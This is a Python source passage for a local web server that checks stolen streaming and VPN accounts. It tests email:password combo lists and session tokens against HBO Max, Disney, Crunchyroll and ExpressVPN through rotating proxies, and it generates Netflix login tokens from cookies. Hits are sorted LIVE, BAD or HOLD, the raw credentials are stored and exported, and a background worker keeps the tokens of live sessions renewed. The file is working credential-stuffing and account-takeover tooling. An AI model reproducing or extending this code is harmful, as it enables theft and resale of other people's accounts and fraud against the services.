                    if isinstance(p, dict):
                        em = p.get("email", "") or p.get("emailAddress", "")
                        if em:
                            email = email or em
                            break
        elif pr.status_code in (401, 403):
            pass  # Token might be FPA-scoped, doesn't mean it's dead

        # Try express-content to check if user has entitlements
        ent_url = "https://comet.api.hbo.com/express-content/urn:hbo:page:home?device-code=desktop&product-code=hboMax&api-version=v9.0&signed-in=true"
        er = val_session.get(ent_url, timeout=10)
        if er.status_code == 200:
            er_data = er.json()
            # If we get content back, user has valid access
            if isinstance(er_data, (list, dict)):
                if not sub_tier:
                    sub_tier = "active"

        val_session.close()
    except Exception:
        pass

    # Determine plan from collected info
    if not plan:
        if sub_tier:
            tier_lower = sub_tier.lower()
            if "ultimate" in tier_lower or "platinum" in tier_lower:
                plan = "Max Ultimate Ad-Free"
            elif "ad_free" in tier_lower or "adfree" in tier_lower or "premium" in tier_lower:
                plan = "Max Ad-Free"
            elif "ads" in tier_lower or "with_ads" in tier_lower or "basic" in tier_lower:
                plan = "Max With Ads"
            elif tier_lower == "active":
                plan = "Max (Active Subscription)"
            else:
                plan = f"Max {sub_tier.replace('_', ' ').title()}"
        elif entitlements:
            ent_str = " ".join(str(e) for e in entitlements).lower()
            if "hbo" in ent_str or "max" in ent_str:
                plan = "Max (Active)"
            else:
                plan = "Max (Entitlements Found)"
        else:
            plan = "Max (Free / No Subscription)"

    # Determine status
    has_sub = bool(sub_tier) or bool(entitlements)
    if has_sub and not is_anonymous:
        status = "LIVE"
    elif not is_anonymous and (user_id or profile_id):
        status = "HOLD"
    elif is_anonymous:
        status = "DEAD"
    else:
        status = "HOLD"

    # Format expiry
    exp_date = ""
    if exp_ts:
        try:
            from datetime import datetime as _dt
            exp_date = _dt.fromtimestamp(exp_ts).strftime("%Y-%m-%d %H:%M:%S")
        except Exception:
            pass

    country_name = normalize_country(country) if country and len(country) == 2 else (country or "N/A")

    save_history("hbomax", status, plan=plan, billing=exp_date,
                 country=country_name, route=route,
                 raw_cookie=token_text[:200], email=email)

    return {
        "status": status,
        "email": email or "N/A",
        "plan": plan,
        "country": country_name,
        "tier": sub_tier or "N/A",
        "token_expiry": exp_date,
        "user_id": user_id or "N/A",
        "profile_id": profile_id or "N/A",
        "profiles": profiles_count if profiles_count else "N/A",
        "service": service_code or product_code or token_type or "N/A",
        "subdivision": subdivision or "N/A",
        "device_id": device_id or "N/A",
        "session_expires": cookie_session_info or "N/A",
        "has_refresh_token": bool(refresh_token),
        "route": route,
        "mode": "token",
        "input_format": input_format,
    }


def check_hbomax_account(email, password, use_proxy=True):
    """Check an HBO Max / Max account via Comet API. Returns dict with status/details."""
    proxy_url = None
    proxy_label = "Direct"
    if use_proxy:
        prx, label, raw_url = get_random_proxy()
        if prx:
            proxy_url = prx.get("http") or prx.get("https")
            proxy_label = label or "Proxy"

    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    device_serial = str(_uuid_mod.uuid4())

    session = requests.Session()
    session.verify = False
    session.headers.update(HBO_BASE_HDRS)
    if proxies:
        session.proxies = proxies

    # Step 1: Client credentials token
    try:
        step1_body = {
            "client_id": HBO_CLIENT_ID,
            "client_secret": HBO_CLIENT_SECRET,
            "scope": "browse video_playback_free",
            "grant_type": "client_credentials",
            "deviceSerialNumber": device_serial,
            "clientDeviceData": {
                "paymentProviderCode": "blackmarket"
            }
        }
        r1 = session.post(HBO_TOKEN_URL, json=step1_body, timeout=20)

        if r1.status_code == 403 or "geo" in r1.text.lower():
            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": "Geo-blocked / IP blocked by HBO", "route": route}

        if r1.status_code != 200:
            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Client auth failed ({r1.status_code})", "route": route}

        r1_data = r1.json()
        client_token = r1_data.get("access_token")
        if not client_token:
            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": "No client access_token returned", "route": route}

    except requests.exceptions.RequestException as e:
        save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"Client auth request failed: {str(e)[:100]}", "route": route}

    # Step 2: User login
    try:
        session.headers["Authorization"] = f"Bearer {client_token}"
        step2_body = {
            "scope": "browse video_playback device elevated_account_management",
            "grant_type": "user_name_password",
            "username": email,
            "password": password
        }
        r2 = session.post(HBO_TOKEN_URL, json=step2_body, timeout=20)
        r2_text = r2.text.lower()

        if r2.status_code == 401 or "incorrect" in r2_text or "invalid" in r2_text:
            save_history("hbomax", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "reason": "Wrong password or account not found", "route": route}

        if r2.status_code == 403 or "geo" in r2_text:
            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": "Geo-blocked / IP blocked", "route": route}

        if r2.status_code == 429:
            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": "Rate limited (429)", "route": route}

        r2_data = r2.json()

        is_logged_in = r2_data.get("isUserLoggedIn", False)
        user_token = r2_data.get("access_token", "")
        refresh_token = r2_data.get("refresh_token", "")

        if not is_logged_in and not user_token:
            # Check for specific error messages
            err_msg = r2_data.get("message", "") or r2_data.get("error_description", "") or ""
            if "incorrect" in err_msg.lower() or "invalid" in err_msg.lower():
                save_history("hbomax", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
                return {"status": "BAD", "reason": "Wrong password or account not found", "route": route}
            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Login failed: {err_msg or r2.status_code}", "route": route}

    except requests.exceptions.RequestException as e:
        save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"Login request failed: {str(e)[:100]}", "route": route}

    session.close()

    # Parse JWT for subscription info
    plan = "Max (Free)"
    country = ""
    sub_tier = ""
    exp_date = ""

    if user_token:
        jwt_payload = _hbo_decode_jwt(user_token)
        # Extract subscription info from JWT claims
        sub_tier = jwt_payload.get("subscriptionTier", "") or jwt_payload.get("tier", "") or ""
        country = jwt_payload.get("territory", "") or jwt_payload.get("country", "") or ""
        exp_ts = jwt_payload.get("exp", 0)

        # Parse plan from token claims
        entitlements = jwt_payload.get("entitlements", []) or []
        package_names = jwt_payload.get("packages", []) or []

        if sub_tier:
            tier_lower = sub_tier.lower()
            if "ultimate" in tier_lower or "platinum" in tier_lower:
                plan = "Max Ultimate Ad-Free"
            elif "ad_free" in tier_lower or "adfree" in tier_lower or "premium" in tier_lower:
                plan = "Max Ad-Free"
            elif "ads" in tier_lower or "with_ads" in tier_lower or "basic" in tier_lower:
                plan = "Max With Ads"
            else:
                plan = f"Max {sub_tier.replace('_', ' ').title()}"
        elif entitlements:
            ent_str = " ".join(str(e) for e in entitlements).lower()
            if "hbo" in ent_str or "max" in ent_str:
                plan = "Max (Active)"

        if exp_ts:
            try:
                from datetime import datetime as _dt
                exp_date = _dt.fromtimestamp(exp_ts).strftime("%Y-%m-%d %H:%M:%S")
            except Exception:
                pass

    country_name = normalize_country(country) if country and len(country) == 2 else (country or "N/A")
    status = "LIVE"

    # Save to history
    plan_str = plan
    save_history("hbomax", status, plan=plan_str, billing=exp_date,
                 country=country_name, route=route,
                 raw_cookie=f"{email}:{password}", email=email)

    return {
        "status": status,
        "email": email,
        "plan": plan,
        "country": country_name,
        "tier": sub_tier,
        "token_expiry": exp_date,
        "has_refresh_token": bool(refresh_token),
        "route": route,
    }


# In-memory sliding window rate limiter
rate_limit_lock = threading.Lock()
ip_request_history = {}

def is_rate_limited(ip, max_requests=40, window_seconds=10, bucket="default"):
    if not ip:
        return False
    key = f"{bucket}:{ip}"
    now = time.time()
    with rate_limit_lock:
        timestamps = ip_request_history.get(key, [])
        # prune timestamps older than window
        timestamps = [t for t in timestamps if now - t < window_seconds]
        if len(timestamps) >= max_requests:
            ip_request_history[key] = timestamps
            return True
        timestamps.append(now)
        ip_request_history[key] = timestamps
        return False

def check_pin_authorized(headers):
    cfg = get_config()
    req_pin = str(cfg.get("pin", ""))
    if not req_pin:
        return True
    pin_header = headers.get("X-Suite-Pin") or headers.get("Authorization", "")
    if pin_header.startswith("Bearer "):
        pin_header = pin_header[7:].strip()
    return hmac.compare_digest(pin_header, req_pin)

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_HEAD(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        if path in ("/", "/index.html"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.send_header("X-Frame-Options", "DENY")
            self.end_headers()
        elif path in ("/api/health", "/api/pin/status", "/api/proxies"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
        else:
            self.send_response(200)
            self.end_headers()

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)

        if path in ("/", "/index.html"):
            html_file = os.path.join(os.path.dirname(__file__), "index.html")
            if os.path.exists(html_file):
                with open(html_file, "r", encoding="utf-8") as f:
                    content = f.read().encode("utf-8")
            else:
                content = b"<h1>index.html not found</h1>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.send_header("X-Frame-Options", "DENY")
            self.end_headers()
            self.wfile.write(content)

        elif path == "/api/health":
            uptime = int(time.time() - server_start_time)
            with proxy_lock:
                h_proxies = len(healthy_proxies)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            res = {
                "status": "healthy",
                "uptime_seconds": uptime,
                "timestamp": datetime.now().isoformat(),
                "healthy_proxies": h_proxies
            }
            self.wfile.write(json.dumps(res).encode("utf-8"))

        elif path == "/api/pin/status":
            cfg = get_config()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"enabled": bool(cfg.get("pin"))}).encode("utf-8"))

        elif path == "/api/proxies":
            all_p = load_proxies()
            with proxy_lock:
                h_count = len(healthy_proxies) if all_tested_proxies else len(all_p)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"total": len(all_p), "healthy": h_count}).encode("utf-8"))

        elif path in ("/api/history", "/api/history/export_csv", "/api/analytics", "/api/proxies/detail"):
            if not check_pin_authorized(self.headers):
                self.send_response(401)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error": "Unauthorized: PIN required"}')
                return

            if path == "/api/history":
                limit = int(qs.get("limit", [25])[0])
                offset = int(qs.get("offset", [0])[0])
                search = qs.get("search", [""])[0]
                status = qs.get("status", [""])[0]
                plan = qs.get("plan", [""])[0]
                entry_type = qs.get("type", [""])[0]

                data = get_history(limit=limit, offset=offset, search=search, status=status, plan=plan, entry_type=entry_type)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(data).encode("utf-8"))

            elif path == "/api/history/export_csv":
                search = qs.get("search", [""])[0]
                status = qs.get("status", [""])[0]
                plan = qs.get("plan", [""])[0]
                csv_data = export_history_csv(search=search, status=status, plan=plan)
                self.send_response(200)
                self.send_header("Content-Type", "text/csv; charset=utf-8")
                self.send_header("Content-Disposition", f"attachment; filename=netflix_history_{int(time.time())}.csv")
                self.end_headers()
                self.wfile.write(csv_data.encode("utf-8"))

            elif path == "/api/analytics":
                an = get_analytics()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(an).encode("utf-8"))

            elif path == "/api/proxies/detail":
                raw_text = ""
                if os.path.exists(PROXIES_FILE):
                    with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                        raw_text = f.read()
                with proxy_lock:
                    p_list = all_tested_proxies if all_tested_proxies else load_proxies()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"raw_text": raw_text, "list": p_list}).encode("utf-8"))

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        clen = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(clen) if clen > 0 else b"{}"
        client_ip = self.headers.get("CF-Connecting-IP") or self.headers.get("X-Forwarded-For") or self.client_address[0]

        if self.path == "/api/pin/verify":
            if is_rate_limited(client_ip, max_requests=6, window_seconds=60, bucket="pin_verify"):
                self.send_response(429)
                self.send_header("Content-Type", "application/json")
                self.send_header("Retry-After", "60")
                self.end_headers()
                self.wfile.write(b'{"error": "Too Many Requests: PIN rate limit exceeded."}')
                return
            try:
                p = json.loads(body.decode("utf-8"))
                cfg = get_config()
                req_pin = str(cfg.get("pin", ""))
                pin_input = str(p.get("pin", ""))
                ok = (not req_pin) or hmac.compare_digest(pin_input, req_pin)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"ok": ok}).encode("utf-8"))
            except Exception as e:
                self.send_response(400)
                self.end_headers()

        elif self.path == "/api/pin/set":
            if is_rate_limited(client_ip, max_requests=6, window_seconds=60, bucket="pin_set"):
                self.send_response(429)
                self.send_header("Content-Type", "application/json")
                self.send_header("Retry-After", "60")
                self.end_headers()
                self.wfile.write(b'{"error": "Too Many Requests: PIN rate limit exceeded."}')
                return
            try:
                p = json.loads(body.decode("utf-8"))
                cfg = get_config()
                cur_pin = str(cfg.get("pin", ""))
                cur_input = str(p.get("current", ""))
                if cur_pin and not hmac.compare_digest(cur_input, cur_pin):
                    self.send_response(401)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": False, "error": "PIN saat ini salah"}).encode("utf-8"))
                    return
                new_p = str(p.get("new_pin", "")).strip()
                if new_p and len(new_p) > 20:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": False, "error": "PIN terlalu panjang (maks 20 karakter)"}).encode("utf-8"))
                    return
                cfg["pin"] = new_p
                save_config(cfg)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"ok": True}).encode("utf-8"))
            except Exception as e:
                self.send_response(400)
                self.end_headers()

        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/hbomax/check", "/api/hbomax/token", "/api/proxies/save", "/api/proxies/test", "/api/history/clear", "/api/system/reload"):
            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/hbomax/check", "/api/hbomax/token") else 50
            if is_rate_limited(client_ip, max_requests=rate_limit, window_seconds=10, bucket="api"):
                self.send_response(429)
                self.send_header("Content-Type", "application/json")
                self.send_header("Retry-After", "5")
                self.end_headers()
                self.wfile.write(b'{"error": "Too Many Requests. Rate limit exceeded."}')
                return

            if not check_pin_authorized(self.headers):
                self.send_response(401)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error": "Unauthorized: PIN required"}')
                return

            if self.path == "/api/token":
                try:
                    p = json.loads(body.decode("utf-8"))
                    token_url, android_url, tv_url, token, exp, route = generate_nftoken(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
                    res = json.dumps({
                        "url": token_url,
                        "android_url": android_url,
                        "tv_url": tv_url,
                        "token": token,
                        "expires": exp,
                        "route": route
                    }).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"error": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    out = check_netflix_membership(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"live": False, "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/disney/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    email = p.get("email", "").strip()
                    password = p.get("password", "").strip()
                    if not email or not password:
                        combo = p.get("combo", "").strip()
                        if combo:
                            # Strip metadata after email:password (e.g. "email:pass | Sub:... | ...")
                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
                            if ":" in combo_clean:
                                email, password = combo_clean.split(":", 1)
                                email = email.strip()
                                password = password.strip()
                    if not email or not password:
                        raise ValueError("Email dan password wajib diisi")
                    out = check_disney_account(email, password, use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/crunchyroll/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    email = p.get("email", "").strip()
                    password = p.get("password", "").strip()
                    if not email or not password:
                        combo = p.get("combo", "").strip()
                        if combo:
                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
                            if ":" in combo_clean:
                                email, password = combo_clean.split(":", 1)
                                email = email.strip()
                                password = password.strip()
                    if not email or not password:
                        raise ValueError("Email dan password wajib diisi")
                    out = check_crunchyroll_account(email, password, use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/expressvpn/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    email = p.get("email", "").strip()
                    password = p.get("password", "").strip()
                    if not email or not password:
                        combo = p.get("combo", "").strip()
                        if combo:
                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
                            if ":" in combo_clean:
                                email, password = combo_clean.split(":", 1)
                                email = email.strip()
                                password = password.strip()
                    if not email or not password:
                        raise ValueError("Email dan password wajib diisi")
                    out = check_expressvpn_account(
                        email, password,
                        use_proxy=p.get("use_proxy", True),
                        get_proxy_fn=get_random_proxy,
                        save_history_fn=save_history
                    )
                    # Save ExpressVPN result to history DB
                    evpn_status = out.get("status", "ERROR")
                    evpn_plan = out.get("plan", "")
                    if evpn_plan:
                        evpn_plan = f"ExpressVPN {evpn_plan}"
                    evpn_billing = ""
                    if out.get("expire_date"):
                        days = out.get("days_left", 0)
                        evpn_billing = f"Exp: {out['expire_date']} ({days}d left)"
                        if out.get("auto_renew") == "true":
                            evpn_billing += " [Auto-renew]"
                    evpn_route = out.get("route", "Direct")
                    if isinstance(evpn_route, tuple):
                        evpn_route = str(evpn_route[1]) if len(evpn_route) > 1 else str(evpn_route)
                    save_history("expressvpn", evpn_status, plan=evpn_plan, billing=evpn_billing,
                                 country="", route=evpn_route,
                                 raw_cookie=f"{email}:{password}", email=email)
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/hbomax/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    email = p.get("email", "").strip()
                    password = p.get("password", "").strip()
                    if not email or not password:
                        combo = p.get("combo", "").strip()
                        if combo:
                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
                            if ":" in combo_clean:
                                email, password = combo_clean.split(":", 1)
                                email = email.strip()
                                password = password.strip()
                    if not email or not password:
                        raise ValueError("Email dan password wajib diisi")
                    out = check_hbomax_account(email, password, use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/hbomax/token":
                try:
                    p = json.loads(body.decode("utf-8"))
                    token = p.get("token", "").strip()
                    if not token:
                        raise ValueError("Token (access_token / refresh_token) wajib diisi")
                    out = check_hbomax_token(token, use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/proxies/save":
                try:
                    p = json.loads(body.decode("utf-8"))
                    text = p.get("text", "")
                    with open(PROXIES_FILE, "w", encoding="utf-8") as f:
                        f.write(text.strip() + "\n")
                    all_p = load_proxies()
                    with proxy_lock:
                        healthy_proxies.clear()
                        all_tested_proxies.clear()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": True, "count": len(all_p)}).encode("utf-8"))
                except Exception as e:
                    self.send_response(400)
                    self.end_headers()

            elif self.path == "/api/proxies/test":
                test_all_proxies_now()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"ok": True}).encode("utf-8"))

            elif self.path == "/api/system/reload":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"status": "reloading"}')
                def _do_exit():
                    time.sleep(0.5)
                    os._exit(0)
                threading.Thread(target=_do_exit, daemon=True).start()
            elif self.path == "/api/history/clear":
                try:
                    payload = json.loads(body.decode("utf-8")) if body else {}
                except Exception:
                    payload = {}
                only_dead = bool(payload.get("only_dead", False))
                clear_history(only_dead=only_dead)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"status": "cleared"}')
        else:
            self.send_response(404)
            self.end_headers()

def session_vault_worker():
    """Background worker: automatically renews and validates expiring active sessions in DB."""
    while True:
        time.sleep(1800)
        try:
            with db_lock:
                conn = get_db()
                c = conn.cursor()
                c.execute('SELECT id, raw_cookie FROM history WHERE status = "LIVE" AND raw_cookie != "" ORDER BY id DESC LIMIT 10')
                rows = c.fetchall()
                conn.close()

            for row_id, raw_cookie in rows:
                try:
                    t_url, a_url, tv_url, tok, exp, route = generate_nftoken(raw_cookie, use_proxy=True)
                    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with db_lock:
                        conn = get_db()
                        conn.execute('UPDATE history SET token_url = ?, created_at = ? WHERE id = ?', (t_url, now, row_id))
                        conn.commit()
                        conn.close()
                    logging.info(f"Session Vault: renewed token for history ID {row_id}")
                except Exception as e:
                    err = str(e).lower()
                    if any(k in err for k in ("mati", "invalid", "tidak ditemukan", "401", "403")):
                        with db_lock:
                            conn = get_db()
                            conn.execute('UPDATE history SET status = "DEAD" WHERE id = ?', (row_id,))
                            conn.commit()
                            conn.close()
                        logging.warning(f"Session Vault: marked ID {row_id} as DEAD ({e})")
                    else:
                        logging.warning(f"Session Vault: renew error ID {row_id}: {e}")
                time.sleep(2)
        except Exception as ex:
            logging.error(f"Session Vault worker error: {ex}")

class ThreadingSimpleServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

def run():
    init_db()
    threading.Thread(target=proxy_health_worker, daemon=True).start()
    threading.Thread(target=session_vault_worker, daemon=True).start()
    socketserver.TCPServer.allow_reuse_address = True
    server = ThreadingSimpleServer(("", PORT), Handler)
    print(f"Server jalan: http://localhost:{PORT}")
    logging.info(f"Server started on port {PORT}")
    server.serve_forever()

if __name__ == "__main__":
    run()
